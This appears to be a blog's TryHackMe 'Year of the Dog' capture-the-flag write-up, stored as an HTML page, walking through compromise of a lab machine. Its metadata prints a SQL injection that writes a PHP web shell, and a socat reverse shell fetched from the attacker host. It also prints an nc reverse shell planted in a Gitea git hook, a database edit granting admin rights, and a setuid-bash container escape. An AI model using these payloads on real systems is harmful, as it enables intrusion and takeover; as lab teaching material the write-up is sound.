@@ -1,0 +1,500 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Year of the Dog | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Year of the Dog TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/year-of-the-dog/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/year-of-the-dog/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Year of the Dog"><meta property="og:description" content="Year of the Dog TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/year-of-the-dog/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Year of the Dog"><meta name=twitter:description content="Year of the Dog TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Year of the Dog","item":"https://s4ch.github.io/writeups/tryhackme/year-of-the-dog/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Year of the Dog","name":"Year of the Dog","description":"Year of the Dog TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Always so polite…\nYear of the Dog\n💢 We will cover the topics Network Enumeration SQL Injection Reverse Engineering SQL Manupilation Git Hook Exploitation Docker Escape Task 1 Flags Who knew? The dog has some bite!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 kali@kali:~/CTFs/tryhackme/Year of the Dog$ sudo nmap -A -sS -sC -sV -O 10.10.179.85 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 19:13 CET Nmap scan report for 10.10.179.85 Host is up (0.032s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA) | 256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA) |_ 256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Canis Queue No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=40485%PV=Y%DS=2%DC=T%G=Y%TM=5FB01E OS:68%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 32.22 ms 10.8.0.1 2 33.13 ms 10.10.179.85 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds 644bbad7b32f0a63ef4dc1de84e153ca'\n1 Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''644bbad7b32f0a63ef4dc1de84e153ca''' at line 1 1 ' union select 1, @@version-- - You are number 5.7.31-0ubuntu0.18.04.1 in the queue\n1 ' union select 1, table_name FROM information_schema.tables-- - You are number queue in the queue\n1 ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- - http://10.10.179.85/shell.php?cmd=whoami\n1 wget 10.8.106.222/socat -q -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat tcp:10.8.106.222:53 exec:\"bash -li\",pty,stderr,sigint,setsid,sane 1 wget%2010.8.106.222%2Fsocat%20-q%20-O%20%2Ftmp%2Fsocat%3B%20chmod%20%2Bx%20%2Ftmp%2Fsocat%3B%20%2Ftmp%2Fsocat%20tcp%3A10.8.106.222%3A53%20exec%3A%22bash%20-li%22%2Cpty%2Cstderr%2Csigint%2Csetsid%2Csane 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/CTFs/tryhackme/Year of the Dog$ sudo socat tcp-l:53 file:`tty`,raw,echo=0 [sudo] password for kali: www-data@year-of-the-dog:/home/dylan$ ls -la total 120 drwxr-xr-x 4 dylan dylan 4096 Sep 5 22:36 . drwxr-xr-x 3 root root 4096 Sep 3 17:23 .. lrwxrwxrwx 1 dylan dylan 9 Sep 3 17:24 .bash_history -\u003e /dev/null -rw-r--r-- 1 dylan dylan 220 Sep 3 17:23 .bash_logout -rw-r--r-- 1 dylan dylan 3771 Sep 3 17:23 .bashrc drwx------ 2 dylan dylan 4096 Sep 3 17:24 .cache -rw-rw-r-- 1 dylan dylan 53 Sep 5 21:40 .gitconfig drwx------ 3 dylan dylan 4096 Sep 3 17:24 .gnupg lrwxrwxrwx 1 root root 9 Sep 3 21:16 .mysql_history -\u003e /dev/null -rw-r--r-- 1 dylan dylan 807 Sep 3 17:23 .profile -rw-r--r-- 1 dylan dylan 0 Sep 3 17:25 .sudo_as_admin_successful -r-------- 1 dylan dylan 38 Sep 5 22:36 user.txt -rw-r--r-- 1 dylan dylan 85134 Sep 5 21:11 work_analysis www-data@year-of-the-dog:/home/dylan$ cat user.txt cat: user.txt: Permission denied www-data@year-of-the-dog:/home/dylan$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 www-data@year-of-the-dog:/home/dylan$ head work_analysis Sep 5 20:52:34 staging-server sshd[39184]: Received disconnect from 192.168.1.142 port 45582:11: Bye Bye [preauth] Sep 5 20:52:34 staging-server sshd[39184]: Disconnected from authenticating user root 192.168.1.142 port 45582 [preauth] Sep 5 20:52:35 staging-server sshd[39190]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39194]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39192]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39189]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39186]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root Sep 5 20:52:35 staging-server sshd[39196]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142 user=root www-data@year-of-the-dog:/home/dylan$ grep \"dylan\" work_analysis Sep 5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 Sep 5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2 Sep 5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth] www-data@year-of-the-dog:/home/dylan$ dylan:Labr4d0rs4L1f3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kali@kali:~/CTFs/tryhackme/Year of the Dog$ ssh dylan@10.10.179.85 The authenticity of host '10.10.179.85 (10.10.179.85)' can't be established. ECDSA key fingerprint is SHA256:ZQhtZbHSQm8e0SOq4EyzzwfLf01L5P0MC3bdo9xqb0M. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.179.85' (ECDSA) to the list of known hosts. dylan@10.10.179.85's password: __ __ __ _ _ ____ \\ \\ / /__ __ _ _ __ ___ / _| | |_| |__ ___ | _ \\ ___ __ _ \\ V / _ \\/ _` | '__| / _ \\| |_ | __| '_ \\ / _ \\ | | | |/ _ \\ / _` | | | __/ (_| | | | (_) | _| | |_| | | | __/ | |_| | (_) | (_| | |_|\\___|\\__,_|_| \\___/|_| \\__|_| |_|\\___| |____/ \\___/ \\__, | |___/ dylan@year-of-the-dog:~$ 1 2 dylan@year-of-the-dog:~$ cat user.txt THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji} 1 2 3 4 5 6 7 8 9 10 11 12 13 dylan@year-of-the-dog:~$ ss -tulwn Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port icmp6 UNCONN 0 0 *%eth0:58 *:* udp UNCONN 0 0 0.0.0.0:41742 0.0.0.0:* udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* udp UNCONN 0 0 10.10.179.85%eth0:68 0.0.0.0:* tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:3000 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:36097 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* tcp LISTEN 0 128 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* 1 2 3 www-data@year-of-the-dog:/home/dylan$ /tmp/socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:3000 \u0026 [1] 1590 www-data@year-of-the-dog:/home/dylan$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 dylan@year-of-the-dog:~$ ls -la / total 239796 drwxr-xr-x 23 root root 4096 Sep 5 19:29 . drwxr-xr-x 23 root root 4096 Sep 5 19:29 .. drwxr-xr-x 2 root root 4096 Sep 3 17:31 bin drwxr-xr-x 3 root root 4096 Sep 3 17:34 boot drwxr-xr-x 17 root root 3680 Nov 14 18:10 dev drwxr-xr-x 93 root root 4096 Sep 6 23:31 etc drwxr-xr-x 5 root root 4096 Sep 5 19:29 gitea drwxr-xr-x 3 root root 4096 Sep 3 17:23 home lrwxrwxrwx 1 root root 34 Sep 3 17:33 initrd.img -\u003e boot/initrd.img-4.15.0-115-generic lrwxrwxrwx 1 root root 33 Sep 3 17:17 initrd.img.old -\u003e boot/initrd.img-4.15.0-20-generic drwxr-xr-x 23 root root 4096 Sep 5 13:21 lib drwxr-xr-x 2 root root 4096 Sep 3 17:30 lib64 drwx------ 2 root root 16384 Sep 3 17:17 lost+found drwxr-xr-x 3 root root 4096 Sep 3 17:17 media drwxr-xr-x 2 root root 4096 Apr 26 2018 mnt drwxr-xr-x 3 root root 4096 Sep 5 13:21 opt dr-xr-xr-x 121 root root 0 Nov 14 18:10 proc drwx------ 4 root root 4096 Sep 6 14:07 root drwxr-xr-x 28 root root 900 Nov 14 18:10 run drwxr-xr-x 2 root root 12288 Sep 5 13:21 sbin drwxr-xr-x 2 root root 4096 Apr 26 2018 srv -rw------- 1 root root 245452800 Sep 3 17:17 swapfile dr-xr-xr-x 13 root root 0 Nov 14 18:10 sys drwxrwxrwt 10 root root 4096 Nov 14 18:48 tmp drwxr-xr-x 10 root root 4096 Sep 3 17:17 usr drwxr-xr-x 13 root root 4096 Sep 3 17:34 var lrwxrwxrwx 1 root root 31 Sep 3 17:33 vmlinuz -\u003e boot/vmlinuz-4.15.0-115-generic lrwxrwxrwx 1 root root 30 Sep 3 17:17 vmlinuz.old -\u003e boot/vmlinuz-4.15.0-20-generic dylan@year-of-the-dog:~$ cd /gitea/ dylan@year-of-the-dog:/gitea$ http://10.10.179.85:8080/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 kali@kali:~/CTFs/tryhackme/Year of the Dog$ scp dylan@10.10.179.85:/gitea/gitea/gitea.db /home/kali/CTFs/tryhackme/Year\\ of\\ the\\ Dog/gitea.db dylan@10.10.179.85's password: gitea.db 100% 1184KB 393.6KB/s 00:03 kali@kali:~/CTFs/tryhackme/Year of the Dog$ sqlite3 gitea.db SQLite version 3.31.1 2020-01-27 19:55:54 Enter \".help\" for usage hints. sqlite\u003e SELECT * FROM user; 1|dylan|Dylan|Dylan Anderson|dylan@yearofthedog.thm|0|enabled|f2fd45caa2f5eae17cb5faa06eb57c4ad05532550fe37ae99e2245429757af09350be12abba616de4e8f0e37d223bd327261|argon2|0|0|0||0|||Rs6zSrVgx0|vkA9FTpZ72|en-US||1599331364|1599511857|1599511857|0|-1|1|1|0|0|0|1|0|8bb88c80301457422026e95699061e4a|dylan@yearofthedog.thm|1|0|0|0|1|0|0|0|0||gitea|0 2|test|test||test@example.de|0|enabled|e6d955e14c8e7d1736ea12090cc7fd8bfb9ed04ed907d06626969038c60dc8a341925af3bcfa870805bc07010e8a18f47a3f|argon2|0|0|0||0|||evuSMwlzZI|5lIckyKZjs|en-US||1605380293|1605380293|1605380293|0|-1|1|0|0|0|0|1|0|27091d6d9177f6041782b04c2223746f|test@example.de|0|0|0|0|0|0|0|0|0||gitea|0 sqlite\u003e select lower_name, is_admin from user; dylan|1 test|0 sqlite\u003e UPDATE user SET is_admin=1 WHERE lower_name=\"test\"; sqlite\u003e .quit kali@kali:~/CTFs/tryhackme/Year of the Dog$ http://10.10.179.85:8080/admin\nhttp://10.10.179.85:8080/test/Test-Repo/settings/hooks/git/pre-receive\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/bin/sh # # An example hook script to make use of push options. # The example simply echoes all push options that start with 'echoback=' # and rejects all pushes when the \"reject\" push option is used. # # To enable this hook, rename this file to \"pre-receive\". if test -n \"$GIT_PUSH_OPTION_COUNT\" then i=0 while test \"$i\" -lt \"$GIT_PUSH_OPTION_COUNT\" do eval \"value=\\$GIT_PUSH_OPTION_$i\" case \"$value\" in echoback=*) echo \"echo from the pre-receive-hook: ${value#*=}\" \u003e\u00262 ;; reject) exit 1 esac i=$((i + 1)) done fi mkfifo /tmp/f; nc 10.8.106.222 9001 \u003c /tmp/f | /bin/sh \u003e/tmp/f 2\u003e\u00261; rm /tmp/f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 dylan@year-of-the-dog:~$ git clone http://localhost:3000/test/Test-Repo \u0026\u0026 cd Test-Repo Cloning into 'Test-Repo'... warning: You appear to have cloned an empty repository. dylan@year-of-the-dog:~/Test-Repo$ echo \"test\" \u003e\u003e README.md dylan@year-of-the-dog:~/Test-Repo$ git add README.md dylan@year-of-the-dog:~/Test-Repo$ git commit -m \"Exploit\" [master (root-commit) 95a2fec] Exploit 1 file changed, 1 insertion(+) create mode 100644 README.md dylan@year-of-the-dog:~/Test-Repo$ git push Username for 'http://localhost:3000': test Password for 'http://test@localhost:3000': Counting objects: 3, done. Writing objects: 100% (3/3), 217 bytes | 217.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0) 1 2 3 4 5 6 dylan@year-of-the-dog:/gitea/gitea$ cd /bin dylan@year-of-the-dog:/bin$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 172.17.0.2 - - [14/Nov/2020 19:14:14] \"GET /bash HTTP/1.1\" 200 - ^C Keyboard interrupt received, exiting. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kali@kali:~/CTFs/tryhackme/Year of the Dog$ nc -nlvp 9001 Listening on 0.0.0.0 9001 Connection received on 10.10.179.85 36967 whoami git id uid=1000(git) gid=1000(git) groups=1000(git),1000(git) sudo -l User git may run the following commands on 42040a8f97fc: (ALL) NOPASSWD: ALL sudo -s id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) wget 172.17.0.1:8000/bash -O /data/bash Connecting to 172.17.0.1:8000 (172.17.0.1:8000) saving to '/data/bash' bash 100% |********************************| 1087k 0:00:00 ETA '/data/bash' saved chmod 4755 /data/bash 1 2 3 4 5 6 7 8 9 10 11 12 13 dylan@year-of-the-dog:/gitea$ ls -la total 1108 drwxr-xr-x 5 root root 4096 Nov 14 19:14 . drwxr-xr-x 23 root root 4096 Sep 5 19:29 .. -rwsr-xr-x 1 root root 1113504 Nov 14 19:14 bash drwxr-xr-x 5 dylan dylan 4096 Sep 5 19:41 git drwxr-xr-x 9 dylan dylan 4096 Nov 14 19:05 gitea drwx------ 2 root root 4096 Sep 5 19:29 ssh dylan@year-of-the-dog:/gitea$ ./bash -p bash-4.4# id uid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan) bash-4.4# cat /root/root.txt THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh} User Flag\nTHM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}\nRoot Flag\nTHM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}\n","wordCount":"1769","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/year-of-the-dog/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Year of the Dog</h1><div class=post-description>Year of the Dog TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;1769 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-flags>Task 1 Flags</a></li></ul></nav></div></details></div><div class=post-content><p>Always so polite&mldr;</p><p><a href=https://tryhackme.com/room/yearofthedog>Year of the Dog</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enumeration</li><li>SQL Injection</li><li>Reverse Engineering</li><li>SQL Manupilation</li><li>Git Hook Exploitation</li><li>Docker Escape</li></ul><hr><h2 id=task-1-flags>Task 1 Flags<a hidden class=anchor aria-hidden=true href=#task-1-flags>#</a></h2><p>Who knew? The dog has some bite!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Year of the Dog$ sudo nmap -A -sS -sC -sV -O 10.10.179.85
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 19:13 CET
+</span></span><span class=line><span class=cl>Nmap scan report for 10.10.179.85
+</span></span><span class=line><span class=cl>Host is up (0.032s latency).
+</span></span><span class=line><span class=cl>Not shown: 998 closed ports
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey:
+</span></span><span class=line><span class=cl>|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
+</span></span><span class=line><span class=cl>|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
+</span></span><span class=line><span class=cl>|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: Canis Queue
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=40485%PV=Y%DS=2%DC=T%G=Y%TM=5FB01E
+</span></span><span class=line><span class=cl>OS:68%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
+</span></span><span class=line><span class=cl>OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
+</span></span><span class=line><span class=cl>OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
+</span></span><span class=line><span class=cl>OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span class=line><span class=cl>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span class=line><span class=cl>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span class=line><span class=cl>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span class=line><span class=cl>OS:D=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 8888/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   32.22 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   33.13 ms 10.10.179.85
+</span></span><span class=line><span class=cl>
